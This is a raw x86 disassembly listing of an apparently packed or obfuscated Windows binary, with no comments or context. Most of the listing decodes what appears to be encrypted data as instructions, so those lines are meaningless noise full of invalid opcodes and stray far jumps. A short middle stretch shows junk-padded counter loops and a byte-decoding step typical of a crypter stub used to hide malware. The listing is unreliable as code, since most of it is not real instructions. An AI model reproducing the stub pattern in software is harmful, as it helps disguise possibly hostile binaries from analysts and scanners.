  4069dd:	mov    ebx,DWORD PTR [ebx+ecx*1-0x6ac7f228]
  4069e4:	sub    DWORD PTR [edx+ebx*4-0xd],esi
  4069e8:	sub    al,0xec
  4069ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069eb:	fdivrp st(6),st
  4069ed:	push   si
  4069ef:	ret    
  4069f0:	sbb    esp,ebp
  4069f2:	call   0x5d90:0x4d4cd387
  4069f9:	bound  ebp,QWORD PTR [esi-0x552b2ae3]
  4069ff:	enter  0x2a3a,0x71
  406a03:	push   0xfffffff9
  406a05:	fisttp QWORD PTR [esi-0xe56a6e8]
  406a0b:	bsr    ebp,DWORD PTR [ecx+eax*2]
  406a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a10:	fs xchg esp,eax
  406a12:	and    ebp,DWORD PTR [edi]
  406a14:	ins    DWORD PTR es:[edi],dx
  406a15:	cld    
  406a16:	cmp    ebp,DWORD PTR [eax-0x4907d29e]
  406a1c:	aaa    
  406a1d:	ror    BYTE PTR [eax-0x58],0x4d
  406a21:	and    dh,BYTE PTR [eax+0x1d]
  406a24:	sbb    dl,BYTE PTR [edi]
  406a26:	mov    cl,0x61
  406a28:	test   eax,0x9971d527
  406a2d:	outs   dx,BYTE PTR ds:[esi]
  406a2e:	sbb    ebx,DWORD PTR [eax]
  406a30:	push   eax
  406a31:	fimul  WORD PTR [esi]
  406a33:	dec    edx
  406a34:	jae    0x406a14
  406a36:	pop    esp
  406a37:	adc    al,0x6a
  406a39:	cwde   
  406a3a:	sbb    bh,BYTE PTR [ebx-0x633b6ae]
  406a40:	xchg   DWORD PTR [ebx-0x59],ecx
  406a43:	addr16 sbb eax,0xc4be97d1
  406a49:	ror    DWORD PTR [eax+0x42],0x90
  406a4d:	cmp    al,0x47
  406a4f:	or     BYTE PTR ds:0xe5a9640b,dl
  406a55:	cdq    
  406a56:	jns    0x406a67
  406a58:	and    cl,BYTE PTR [eax+eiz*4]
  406a5b:	bound  ecx,QWORD PTR ds:0x718f2cf6
  406a61:	imul   ecx,ecx,0x6d
  406a64:	and    DWORD PTR [esi-0x61dcd83d],ecx
  406a6a:	pop    ebp
  406a6b:	repz bound esi,QWORD PTR [ecx]
  406a6e:	inc    edx
  406a6f:	xor    DWORD PTR [edx],esi
  406a71:	(bad)  
  406a72:	ficom  DWORD PTR [ebx-0x33]
  406a75:	pusha  
  406a76:	sbb    BYTE PTR [edx],al
  406a78:	or     DWORD PTR [ebx-0x66e87596],esi
  406a7e:	and    al,BYTE PTR [esi+0x3593f9a2]
  406a84:	rcl    DWORD PTR [ebp+esi*2+0x122cd5d],1
  406a8b:	ret    0xdb98
  406a8e:	in     eax,dx
  406a8f:	retf   
  406a90:	xchg   edi,eax
  406a91:	cmp    eax,0xa403a852
  406a96:	cmp    bh,BYTE PTR [esi]
  406a98:	mov    ebx,0xea346e0e
  406a9d:	dec    ebp
  406a9e:	mov    cl,0x24
  406aa0:	or     al,0x81
  406aa2:	mov    ebx,0x68cf04de
  406aa7:	dec    ebp
  406aa8:	push   esp
  406aa9:	mov    dl,0x38
  406aab:	pop    esp
  406aac:	lds    edx,FWORD PTR [edi+0x13d4d57f]
  406ab2:	xlat   BYTE PTR ds:[ebx]
  406ab3:	mov    al,0x4b
  406ab5:	push   cs
  406ab6:	inc    edx
  406ab7:	rol    esp,0xb4
  406aba:	inc    eax
  406abb:	cmc    
  406abc:	jl     0x406a69
  406abe:	aas    
  406abf:	std    
  406ac0:	lods   eax,DWORD PTR ds:[esi]
  406ac1:	sbb    eax,0x224de3d8
  406ac6:	ja     0x406a94
  406ac8:	push   0x61
  406aca:	mov    ds:0x9c2ec767,al
  406acf:	mov    DWORD PTR [ecx-0x55],ebp
  406ad2:	dec    edx
  406ad3:	lds    eax,FWORD PTR [esi+0x10]
  406ad6:	pop    esp
  406ad7:	dec    ebx
  406ad8:	or     BYTE PTR [edx-0x47],bl
  406adb:	cmp    eax,0xd7fbe81c
  406ae0:	mov    ch,0x6c
  406ae2:	push   edx
  406ae3:	repz scas al,BYTE PTR es:[edi]
  406ae5:	pop    ebx
  406ae6:	lock int 0x31
  406ae9:	and    BYTE PTR [ecx],al
  406aeb:	and    DWORD PTR [edi+0x43],0x52
  406aef:	sub    al,BYTE PTR gs:[eax]
  406af2:	jae    0x406aa4
  406af4:	stos   DWORD PTR es:[edi],eax
  406af5:	fidiv  DWORD PTR [esp+ebx*4+0x5c]
  406af9:	mov    ds:0x48f3f546,eax
  406afe:	add    BYTE PTR [eax-0x5a],bh
  406b01:	jne    0x406b7f
  406b03:	xchg   esp,eax
  406b04:	sub    al,0xbd
  406b06:	pusha  
  406b07:	popf   
  406b08:	mov    cs,WORD PTR [edi+0x1d]
  406b0b:	jmp    0x406b83
  406b0d:	sbb    BYTE PTR [esi+ebx*1-0x363f6ffa],ch
  406b14:	jl     0x406afb
  406b16:	mov    ds:0x31af104,eax
  406b1b:	jmp    0x7f8e:0x12db20cf
  406b22:	inc    esp
  406b23:	in     eax,dx
  406b24:	rcl    BYTE PTR [edx-0x2696bdf9],0xf7
  406b2b:	sahf   
  406b2c:	sti    
  406b2d:	add    DWORD PTR [edi-0x2d],0x3b503178
  406b34:	int3   
  406b35:	inc    ax
  406b37:	add    dh,dl
  406b39:	imul   BYTE PTR [edx+0x6bf8ea1c]
  406b3f:	xchg   edx,eax
  406b40:	rol    DWORD PTR [ecx+0x3d],1
  406b43:	lahf   
  406b44:	push   0xffffff94
  406b46:	mov    esi,0x167fa383
  406b4b:	jno    0x406b02
  406b4d:	jmp    0x406b57
  406b4f:	(bad)  
  406b50:	cmc    
  406b51:	cmp    edi,DWORD PTR [edx+0x6186022c]
  406b57:	ret    0xd7ab
  406b5a:	inc    edi
  406b5b:	mov    al,0x23
  406b5d:	outs   dx,BYTE PTR ds:[si]
  406b5f:	xlat   BYTE PTR ds:[ebx]
  406b60:	(bad)  
  406b61:	stos   DWORD PTR es:[edi],eax
  406b62:	or     eax,0xc2a2530a
  406b67:	cwde   
  406b68:	jge    0x406b6c
  406b6a:	lds    ebp,FWORD PTR [ebx-0x1bd45317]
  406b70:	mov    eax,0xadc207e2
  406b75:	push   esi
  406b76:	mov    ds:0x35b29142,al
  406b7b:	in     eax,0x6e
  406b7d:	or     eax,0xfa698e28
  406b82:	je     0x406be3
  406b84:	jmp    0x3e15:0x37cc454d
  406b8b:	cmp    bl,BYTE PTR [esi-0x6fcac99e]
  406b91:	ss sbb al,0x25
  406b94:	(bad)  
  406b95:	idiv   BYTE PTR [ebx+0x65]
  406b98:	mov    cl,0xce
  406b9a:	inc    ecx
  406b9b:	sti    
  406b9c:	ss test eax,0xe48e533e
  406ba2:	push   edx
  406ba3:	jae    0x406b71
  406ba5:	mov    ah,al
  406ba7:	icebp  
  406ba8:	xchg   ebx,eax
  406ba9:	xor    eax,0x11c70f81
  406bae:	mov    fs,ebx
  406bb0:	loope  0x406b41
  406bb2:	cmp    eax,0x58e07df0
  406bb7:	enter  0xbfe3,0x6e
  406bbb:	push   es
  406bbc:	in     al,0x74
  406bbe:	in     eax,dx
  406bbf:	lods   eax,DWORD PTR ds:[esi]
  406bc0:	cdq    
  406bc1:	push   edx
  406bc2:	sbb    DWORD PTR [ebp+0x17d8103],ebx
  406bc8:	cmp    ebp,DWORD PTR [esi]
  406bca:	or     eax,0xbdfcd944
  406bcf:	icebp  
  406bd0:	push   edi
  406bd1:	mov    ebp,DWORD PTR [ebx-0x7f386fe8]
  406bd7:	and    bh,bh
  406bd9:	mov    bh,0x54
  406bdb:	pop    edi
  406bdc:	test   esp,edi
  406bde:	in     al,dx
  406bdf:	imul   edx,DWORD PTR [ebx-0x228d8544],0xb6694f93
  406be9:	cdq    
  406bea:	ds inc ebx
  406bec:	push   0x29
  406bee:	ins    BYTE PTR es:[edi],dx
  406bef:	dec    esp
  406bf0:	mov    dh,BYTE PTR [ecx+0x3b]
  406bf3:	cmc    
  406bf4:	mov    ds:0xfe73e8eb,eax
  406bf9:	mov    edi,0x1459d9cd
  406bfe:	adc    ebp,DWORD PTR [esi+0x73fbdac4]
  406c04:	pop    ebp
  406c05:	xchg   ah,cl
  406c07:	sub    ebp,DWORD PTR [esi-0x5c2e62c5]
  406c0d:	and    al,0x22
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	and    al,0xcb
  406c29:	rcr    ch,0x38
  406c2c:	retf   0x7e7e
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	inc    ebp
  406c34:	sbb    dh,BYTE PTR [ebx+eiz*2-0x7c]
  406c38:	jmp    0xc6607246
  406c3d:	xchg   ecx,ebp
  406c3f:	pushf  
  406c40:	lds    edx,FWORD PTR [ebx-0x75677daf]
  406c46:	pop    es
  406c47:	out    0xa3,al
  406c49:	pusha  
  406c4a:	mov    al,ah
  406c4c:	repnz sbb ch,BYTE PTR [edi+0x71d67e2c]
  406c53:	mov    edi,0x35171664
  406c58:	mov    eax,ecx
  406c5a:	push   edx
  406c5b:	adc    al,0x27
  406c5d:	fs cmp eax,0xb168c33c
  406c63:	sbb    ebx,DWORD PTR [edx-0x2a48f9]
  406c69:	push   cs
  406c6a:	sbb    dl,BYTE PTR [ebx-0x578efbdb]
  406c70:	pop    eax
  406c71:	and    BYTE PTR [esi+0x5f],bh
  406c74:	jmp    0x406c21
  406c76:	and    al,BYTE PTR [edx]
  406c78:	(bad)  
  406c79:	es out 0xc1,al
  406c7c:	pop    ds
  406c7d:	mov    dh,0x49
  406c7f:	inc    esi
  406c80:	sub    ebp,edx
  406c82:	xor    ecx,0x53
  406c85:	sub    DWORD PTR [edx],0x75
  406c88:	dec    eax
  406c89:	xchg   esi,eax
  406c8a:	mov    esi,0xb58f28e
  406c8f:	daa    
  406c90:	outs   dx,DWORD PTR ds:[esi]
  406c91:	mov    WORD PTR [ebx],?
  406c93:	lock mov ebp,0x4bb01698
  406c99:	test   DWORD PTR [edx+ebp*1+0x6f672899],0x45d93dfa
  406ca4:	loop   0x406ced
  406ca6:	jno    0x406c29
  406ca8:	repz repnz into 
  406cab:	dec    esp
  406cac:	aam    0xaa
  406cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406caf:	int    0xf2
  406cb1:	xor    ecx,DWORD PTR [edx+ebp*8-0x6e]
  406cb5:	inc    ebx
  406cb6:	jo     0x406c42
  406cb8:	hlt    
  406cb9:	push   es
  406cba:	ins    BYTE PTR es:[edi],dx
  406cbb:	push   esp
  406cbc:	fcomp  DWORD PTR [esp+ebp*2+0x30]
  406cc0:	inc    eax
  406cc1:	pop    ds
  406cc2:	rcl    ch,0x76
  406cc5:	inc    edi
  406cc6:	and    BYTE PTR [edi],bl
  406cc8:	cmp    esi,eax
  406cca:	aam    0xa6
  406ccc:	iret   
  406ccd:	push   esi
  406cce:	popf   
  406ccf:	sub    BYTE PTR [edi+eiz*4],ah
  406cd2:	lock das 
  406cd4:	push   0xa6e6abf5
  406cd9:	mov    ecx,0x4ac2abf8
  406cde:	call   FWORD PTR [eax]
  406ce0:	xor    dl,BYTE PTR [ebx-0x12]
  406ce3:	cdq    
  406ce4:	mov    ds:0x8208ca3,eax
  406ce9:	loope  0x406c9f
  406ceb:	std    
  406cec:	pop    esp
  406ced:	jmp    0x9b90:0xa4d79b81
  406cf4:	pop    esi
  406cf5:	(bad)  
  406cf7:	add    eax,0xcfdc8bc7
  406cfc:	mov    al,0xf4
  406cfe:	mov    ah,0x9
  406d00:	sbb    eax,ebx
  406d02:	push   ecx
  406d03:	adc    ebp,0xffffffad
  406d06:	mov    dh,BYTE PTR [eax-0x65]
  406d09:	cmp    al,0x54
  406d0b:	xor    eax,0x1d9efe21
  406d10:	dec    ebx
  406d11:	scas   eax,DWORD PTR es:[edi]
  406d12:	adc    eax,0x431a522c
  406d17:	daa    
  406d18:	push   cs
  406d19:	je     0x406ca5
  406d1b:	(bad)  
  406d1c:	cmp    eax,ebp
  406d1e:	sar    DWORD PTR [ecx-0x49],0xff
  406d22:	mov    ah,0x45
  406d24:	dec    ebx
  406d25:	into   
  406d26:	pop    eax
  406d27:	mov    ecx,0xd15ed5a5
  406d2c:	cmp    eax,0x2d7d48b3
  406d31:	jbe    0x406ce1
  406d33:	shl    BYTE PTR [esi+edx*2+0x37],1
  406d37:	jne    0x406db7
  406d39:	lock mov bl,0x4e
  406d3c:	jg     0x406cf5
  406d3e:	gs jne 0x406daa
  406d41:	or     dh,BYTE PTR [eax]
  406d43:	sub    edi,DWORD PTR [esi+eax*1+0x11]
  406d47:	sub    eax,0x2906d38
  406d4c:	mov    bh,0x67
  406d4e:	popa   
  406d4f:	scas   eax,DWORD PTR es:[edi]
  406d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d51:	leave  
  406d52:	xchg   ebp,eax
  406d53:	(bad)  
  406d55:	jecxz  0x406d5f
  406d57:	ret    0xa7e3
  406d5a:	jns    0x406d4c
  406d5c:	and    ecx,DWORD PTR [edi+0x28363194]
  406d62:	cwde   
  406d63:	stos   DWORD PTR es:[edi],eax
  406d64:	rcl    DWORD PTR [ebx],0x89
  406d67:	icebp  
  406d68:	sub    BYTE PTR [esi-0x7a049856],ch
  406d6e:	xchg   BYTE PTR [ebx],bh
  406d70:	ss aad 0xca
  406d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d74:	nop
  406d75:	mov    ebx,0x183900bc
  406d7a:	mov    ebp,0x52b7174a
  406d7f:	lods   al,BYTE PTR ds:[esi]
  406d80:	sbb    eax,0x7a8939d9
  406d85:	add    al,0xe3
  406d87:	pop    ds
  406d88:	sub    ah,BYTE PTR [ebx+eiz*1+0x53]
  406d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d8d:	xor    al,0xda
  406d8f:	not    BYTE PTR [eax+0x37]
  406d92:	sbb    eax,0xbd012440
  406d97:	ja     0x406d92
  406d99:	jbe    0x406d3f
  406d9b:	(bad)  
  406d9c:	outs   dx,DWORD PTR ds:[esi]
  406d9d:	dec    esp
  406d9e:	std    
  406d9f:	mov    al,0xa2
  406da1:	push   ebx
  406da2:	adc    BYTE PTR ds:0x2ca30fb5,0x14
  406da9:	push   esi
  406daa:	or     al,0xfe
  406dac:	pop    es
  406dad:	mov    cl,0xf2
  406daf:	bound  edi,QWORD PTR [ebx+0x43]
  406db2:	mov    edx,edx
  406db4:	sub    ecx,DWORD PTR [ecx]
  406db6:	mov    edx,0xf37288e4
  406dbb:	mov    dh,0xe3
  406dbd:	push   edx
  406dbe:	(bad)  
  406dbf:	fidiv  DWORD PTR [esi-0x283adf4f]
  406dc5:	sub    al,ch
  406dc7:	add    BYTE PTR [edi+0x3a],dl
  406dca:	mov    al,ds:0x416f0b14
  406dcf:	mov    esp,0x88f3923e
  406dd4:	dec    edx
  406dd5:	xor    ah,0xdd
  406dd8:	adc    al,0x9b
  406dda:	xchg   esp,eax
  406ddb:	mov    bh,BYTE PTR [edx]
  406ddd:	jo     0x406e45
  406ddf:	and    cl,cl
  406de1:	dec    edx
  406de2:	dec    ecx
  406de3:	sbb    edx,DWORD PTR [esi-0x4546c17f]
  406de9:	(bad)  
  406dea:	ins    BYTE PTR es:[edi],dx
  406deb:	xor    DWORD PTR [edi+esi*1+0x48c67132],esp
  406df2:	js     0x406dd8
  406df4:	popf   
  406df5:	arpl   cx,dx
  406df7:	push   ss
  406df8:	test   DWORD PTR [ebx],esp
  406dfa:	rcl    cl,1
  406dfc:	es sub al,0xf7
  406dff:	lds    ebp,FWORD PTR gs:[edx+0x2c09bee2]
  406e06:	or     DWORD PTR [ecx+0x95eb5fb],0xee2cbb81
  406e10:	pop    es
  406e11:	stos   DWORD PTR es:[edi],eax
  406e12:	ficom  WORD PTR [esi]
  406e14:	inc    edi
  406e15:	pop    edx
  406e16:	or     DWORD PTR [ebx-0x5b],eax
  406e19:	cmp    BYTE PTR fs:[ecx-0x3d],ah
  406e1d:	pop    ebp
  406e1e:	or     DWORD PTR [edx-0x58c7ea9d],esp
  406e24:	mov    cl,0xce
  406e26:	pop    esp
  406e27:	mov    eax,0xd3764fa
  406e2c:	xchg   ebp,eax
  406e2d:	fisttp DWORD PTR [ebp+0x6]
  406e30:	pop    ds
  406e31:	test   al,0x84
  406e33:	mov    al,ds:0x641762d
  406e38:	pop    eax
  406e39:	fnstcw WORD PTR [ebp-0x72]
  406e3c:	out    0x7f,al
  406e3e:	inc    ebp
  406e3f:	call   0xe1491b0
  406e44:	out    dx,al
  406e45:	push   esi
  406e46:	jbe    0x406e57
  406e48:	push   ss
  406e49:	dec    edx
  406e4a:	out    0x4b,al
  406e4c:	inc    esi
  406e4d:	ds mov edx,0x573d3e7f
  406e53:	adc    al,0x1d
  406e55:	inc    edi
  406e56:	test   al,0x7b
  406e58:	jge    0x406e6d
  406e5a:	mov    dh,0xe2
  406e5c:	jmp    0x54711035
  406e61:	and    eax,DWORD PTR [esi+0x6e]
  406e64:	and    BYTE PTR [ecx+0x7fff8d7d],al
  406e6a:	cdq    
  406e6b:	lock pop ebp
  406e6d:	adc    al,0x15
  406e6f:	rcl    BYTE PTR [esi-0x2ed3a0f6],1
  406e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e76:	mov    al,ds:0xf429ca6c
  406e7b:	test   al,0xb3
  406e7d:	cld    
  406e7e:	repnz retf 0xc80b
  406e82:	jb     0x406ef9
  406e84:	jmp    DWORD PTR [edi+0x6f49b292]
  406e8a:	pop    edi
  406e8b:	mov    cl,0x20
  406e8d:	fwait
  406e8e:	loop   0x406eee
  406e90:	xor    eax,0xe8283b4
  406e95:	les    ecx,FWORD PTR [ecx-0x5a1fce2]
  406e9b:	je     0x406e56
  406e9d:	jecxz  0x406e78
  406e9f:	bound  ebp,QWORD PTR [ebx+0x15]
  406ea2:	fadd   QWORD PTR [esi+0x4f]
  406ea5:	xor    edi,edx
  406ea7:	neg    esp
  406ea9:	pop    ss
  406eaa:	dec    edx
  406eab:	push   es
  406eac:	outs   dx,BYTE PTR ds:[esi]
  406ead:	cwde   
  406eae:	sahf   
  406eaf:	outs   dx,BYTE PTR ds:[esi]
  406eb0:	or     esp,ebx
  406eb2:	dec    ecx
  406eb3:	shl    DWORD PTR ds:0xb048f612,0xbc
  406eba:	mov    edi,0x28e57d28
  406ebf:	in     al,dx
  406ec0:	fucomp st(0)
  406ec2:	das    
  406ec3:	test   al,0x29
  406ec5:	rol    BYTE PTR [edx-0x1d547326],0x61
  406ecc:	and    dh,ch
  406ece:	cmp    eax,0xffdf8c13
  406ed3:	js     0x406f0f
  406ed5:	cli    
  406ed6:	mov    esi,DWORD PTR [edi]
  406ed8:	neg    BYTE PTR [esi]
  406eda:	mov    dl,0x47
  406edc:	jo     0x406f3c
  406ede:	loopne 0x406eff
  406ee0:	inc    eax
  406ee1:	push   ecx
  406ee2:	add    esi,DWORD PTR [ecx]
  406ee4:	mov    dl,0x2
  406ee6:	mov    DWORD PTR [ebp+0x3f4af4f5],edx
  406eec:	sbb    esi,DWORD PTR [edx-0x4a241702]
  406ef2:	pop    ebx
  406ef3:	test   DWORD PTR [esi],ebp
  406ef5:	xchg   esp,eax
  406ef6:	lods   al,BYTE PTR ds:[esi]
  406ef7:	shl    BYTE PTR [esi],0xc5
  406efa:	pusha  
  406efb:	dec    edi
  406efc:	xchg   ebx,eax
  406efd:	xor    ebp,esp
  406eff:	mov    ah,0x1e
  406f01:	mov    eax,DWORD PTR [edx-0x2d]
  406f04:	aam    0xc6
  406f06:	xchg   esp,eax
  406f07:	sti    
  406f08:	xor    eax,0xaad01059
  406f0d:	jg     0x406f34
  406f0f:	mov    WORD PTR [ebp-0x56a9f702],?
  406f15:	mov    edi,0x86c9b43f
  406f1a:	stc    
  406f1b:	pop    esp
  406f1c:	ja     0x406f2e
  406f1e:	dec    ebp
  406f1f:	fild   WORD PTR [eax+0x79]
  406f22:	mov    WORD PTR [esp+eax*1],ds
  406f25:	cmp    cl,BYTE PTR [edi]
  406f27:	push   ebp
  406f28:	sub    al,0x8c
  406f2a:	adc    esp,DWORD PTR [edi]
  406f2c:	add    edx,eax
  406f2e:	mov    dl,0x1d
  406f30:	pop    esi
  406f31:	add    DWORD PTR [edx+0x67c6af91],edi
  406f37:	in     eax,0x7
  406f39:	push   ecx
  406f3b:	std    
  406f3c:	mov    eax,ds:0x1506de6c
  406f41:	cwde   
  406f42:	or     edx,DWORD PTR [ebp+ebp*4-0x74]
  406f46:	adc    eax,0x4f6d47f7
  406f4b:	pusha  
  406f4c:	cs shl cl,cl
  406f4f:	or     dh,al
  406f51:	in     eax,dx
  406f52:	jne    0x406f24
  406f54:	add    DWORD PTR [edi+0x1],edi
  406f57:	jecxz  0x406f22
  406f59:	scas   eax,DWORD PTR es:[edi]
  406f5a:	in     al,dx
  406f5b:	leave  
  406f5c:	retf   0x971c
  406f5f:	jg     0x406f11
  406f61:	ss or  eax,0xb986b920
  406f68:	mov    al,ds:0xc811c2c2
  406f6d:	mov    cl,0xc
  406f6f:	push   edx
  406f70:	mov    ds,WORD PTR [ebx-0x7]
  406f73:	jmp    0x406fe0
  406f75:	imul   edi,DWORD PTR [esi-0x5d],0x31
  406f79:	sbb    BYTE PTR [edx+0x700f4b54],al
  406f7f:	mov    esp,0x6066d55
  406f84:	mov    ds:0xb5b9a63b,al
  406f89:	xor    ebx,DWORD PTR [esi-0x34]
  406f8c:	mov    ?,WORD PTR [edi+0x2c387f7b]
  406f92:	test   BYTE PTR [ecx+0x33],bh
  406f95:	cmp    cl,BYTE PTR [ebx+0x748b62fb]
  406f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f9c:	sbb    ah,ch
  406f9e:	(bad)  
  406f9f:	jae    0x406fa4
  406fa1:	ret    0x2ca3
  406fa4:	and    al,BYTE PTR [ecx+0x0]
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430496,0x19
  406fd8:	cmp    DWORD PTR ds:0x430496,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430496,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eac4
  406ffd:	cmp    DWORD PTR ds:0x430496,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430496
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430496,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430496
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430496,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430556,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43054a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee18,0x42ee20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eba4
  4070a9:	cmp    DWORD PTR ds:0x42ee1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43055a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ee28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ee28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ee28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ee28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ee28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ee24
  407123:	call   DWORD PTR ds:0x42eba8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4304ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430492,0x17
  407147:	cmp    DWORD PTR ds:0x430492,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430492,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430492
  407179:	dec    eax
  40717a:	mov    ds:0x430492,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0xe5096efb
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x40718e
  4071b2:	fiadd  WORD PTR [eax]
  4071b4:	ins    BYTE PTR es:[edi],dx
  4071b5:	sbb    BYTE PTR [ebx-0x59],0xb9
  4071b9:	inc    ebx
  4071ba:	popf   
  4071bb:	lds    esi,FWORD PTR [ebp-0x5f93ec75]
  4071c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c2:	outs   dx,BYTE PTR ds:[esi]
  4071c3:	or     DWORD PTR [eax+0x7219fd4c],edx
  4071c9:	rcl    WORD PTR [esi+eax*4+0x3425814c],0x95
  4071d2:	hlt    
  4071d3:	xchg   BYTE PTR [ebx+eiz*4],ah
  4071d6:	xchg   BYTE PTR ds:0x393489cc,bh
  4071dc:	mov    cs:0x77a9e1aa,al
  4071e2:	ss dec esi
  4071e4:	loop   0x4071ca
  4071e6:	int    0xa5
  4071e8:	in     eax,dx
  4071e9:	mov    bl,0x7
  4071eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ec:	(bad)  [edi-0x26]
  4071ef:	mov    ebx,DWORD PTR [edi]
  4071f1:	xchg   esp,eax
  4071f2:	in     al,0x82
  4071f4:	pushf  
  4071f5:	jg     0x407255
  4071f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f8:	and    ah,BYTE PTR [edi-0x38b262e9]
  4071fe:	sub    BYTE PTR [ebx],bl
  407200:	xchg   ecx,eax
  407201:	shr    DWORD PTR [ecx],1
  407203:	and    bh,BYTE PTR [ebp+0x3ba04aed]
  407209:	add    eax,0x847e3a9e
  40720e:	clc    
  40720f:	xor    edx,DWORD PTR [edx+0x3171fbf4]
  407215:	js     0x4071d5
  407217:	in     al,0xeb
  407219:	xor    ebx,DWORD PTR ds:0x9ca9a234
  40721f:	and    ch,BYTE PTR [edx]
  407221:	sahf   
  407222:	bound  esi,QWORD PTR [edx+0x48]
  407225:	popf   
  407226:	je     0x407224
  407228:	mov    eax,0xacfa3e2c
  40722d:	dec    ebp
  40722e:	mov    ch,0x57
  407230:	nop
  407231:	mov    dl,0x3e
  407233:	shl    BYTE PTR [ebx-0x44],cl
  407236:	jl     0x407261
  407238:	mov    edx,edx
  40723a:	mov    eax,ds:0x7a85aed8
  40723f:	inc    edi
  407240:	sti    
  407241:	bound  esi,QWORD PTR [esi]
  407243:	push   ebx
  407244:	and    edi,eax
  407246:	adc    BYTE PTR gs:[ebp+0x75],ah
  40724a:	std    
  40724b:	mov    DWORD PTR [ebx+ebx*8+0x70],ebx
  40724f:	lock pop esi
  407251:	mov    eax,ds:0x5df09ef3
  407256:	sbb    al,dl
  407258:	lods   al,BYTE PTR cs:[esi]
